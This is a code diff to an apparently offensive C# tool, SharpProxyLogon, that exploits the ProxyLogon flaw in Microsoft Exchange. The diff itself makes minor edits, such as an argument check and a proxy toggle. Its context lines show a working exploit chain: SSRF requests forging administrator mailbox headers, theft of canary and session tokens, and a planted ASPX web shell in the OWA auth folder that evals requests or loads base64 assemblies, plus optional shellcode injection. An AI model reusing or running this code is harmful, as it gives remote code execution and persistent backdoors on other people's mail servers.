@@ -37,12 +37,15 @@ _\ \ | | | (_| | |  | |_) / ___/| | | (_) >  <| |_| / /__| (_) | (_| | (_) | | |
             Console.WriteLine("Usage x64 injection: SharpProxyLogon.exe <targetip> <targetemail> <shellcodepath.bin> <inject-target-full-path>");
             string shellcodePath = "";
             string injectiontarget = "";
-           
+
 
             string shellcodeb64 = "";
             string loaderb64 = TikiTorch.ShellcodeLoader;
 
             bool injection = false;
+
+            if (args.Count() == 0)
+                Environment.Exit(0);
 
             string targetServer = args[0];
             string targetEmail = args[1];
@@ -51,9 +54,8 @@ _\ \ | | | (_| | |  | |_) / ___/| | | (_) >  <| |_| / /__| (_) | (_| | (_) | | |
             {
                 shellcodePath = args[2];
                 injectiontarget = args[3];
-              
-                injection = true;
 
+                injection = true;
                 shellcodeb64 = Convert.ToBase64String(File.ReadAllBytes(shellcodePath));
 
             }
@@ -62,10 +64,8 @@ _\ \ | | | (_| | |  | |_) / ___/| | | (_) >  <| |_| / /__| (_) | (_| | (_) | | |
 
             string shellPath = "C:\\\\Program Files\\\\Microsoft\\\\Exchange Server\\\\V15\\\\FrontEnd\\\\HttpProxy\\\\owa\\\\auth\\\\" + randomShellName + ".aspx";
 
-
-
             var shell_content = @"<script language=""JScript"" runat=""server""> function Page_Load(){eval(Request[""data""],""unsafe"");}</script>".Replace("\"", @"\""");
-            
+
             if (injection)
                 shell_content = @"<Script Language=""C#"" Runat=""Server"">public void Page_Load(){/*hr*/System.Reflection.Assembly.Load(System.Convert.FromBase64String(Request.Form[""a""])).EntryPoint.Invoke(null, new object[]{new string[]{Request.Form[""b""]}});}</script>".Replace("\"", @"\""");
 
@@ -82,8 +82,9 @@ _\ \ | | | (_| | |  | |_) / ___/| | | (_) >  <| |_| / /__| (_) | (_| | (_) | | |
 
             var httpClientHandler = new HttpClientHandler
             {
+                //set UseProxy to True if u wanna debug
                 Proxy = proxy,
-                UseProxy = true,
+                UseProxy = false,
                 UseCookies = false,
                 ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
                 {
@@ -203,7 +204,7 @@ _\ \ | | | (_| | |  | |_) / ___/| | | (_) >  <| |_| / /__| (_) | (_| | (_) | | |
                 Console.WriteLine($"[+] Got msExchEcpCanary {msExchEcpCanary}");
                 Console.WriteLine($"[+] Got aspNETSessionID {aspNETSessionID}");
 
-                //ProxyLogon to get Canary token
+            
                 var getOABIdReqMsg = new HttpRequestMessage(
                     HttpMethod.Post,
                     $"https://{targetServer}/ecp/{Guid.NewGuid().ToString().Replace("-", "")}.js"
@@ -220,7 +221,6 @@ _\ \ | | | (_| | |  | |_) / ___/| | | (_) >  <| |_| / /__| (_) | (_| | (_) | | |
                 getOABIdReqMsg.Headers.Add("msExchLogonMailbox", adminSID);
                 getOABIdReqMsg.Headers.Add("msExchTargetMailbox", adminSID);
 
-                //setUNCPathReqMsg.Headers.Add("X-Requesttype", "Connect");
                 getOABIdReqMsg.Headers.Add("X-Clientinfo", Guid.NewGuid().ToString());
                 getOABIdReqMsg.Headers.Add("X-Requestid", Guid.NewGuid().ToString());
                 getOABIdReqMsg.Headers.Add("X-Clientapplication", "Outlook/15.0.4815.1002");
@@ -246,7 +246,7 @@ _\ \ | | | (_| | |  | |_) / ___/| | | (_) >  <| |_| / /__| (_) | (_| | (_) | | |
                 var getOABIdReqResp = await httpClientSSRF.SendAsync(getOABIdReqMsg);
                 var getOABIdContentResp = await getOABIdReqResp.Content.ReadAsStringAsync();
 
-             
+
                 var getOABIdJsonObject = JsonConvert.DeserializeObject<GetOABVirutalDirectory>(getOABIdContentResp);
                 var OABId = getOABIdJsonObject.d.Output.FirstOrDefault().Identity.RawIdentity;
 
@@ -361,7 +361,7 @@ _\ \ | | | (_| | |  | |_) / ___/| | | (_) >  <| |_| / /__| (_) | (_| | (_) | | |
                     shellReqMsg.Headers.Add("X-Requestid", Guid.NewGuid().ToString());
                     shellReqMsg.Headers.Add("X-Clientapplication", "Outlook/15.0.4815.1002");
 
-                 
+
                     var Parameters = new List<KeyValuePair<string, string>>
                         {
                            new KeyValuePair<string, string>("a", loaderb64),
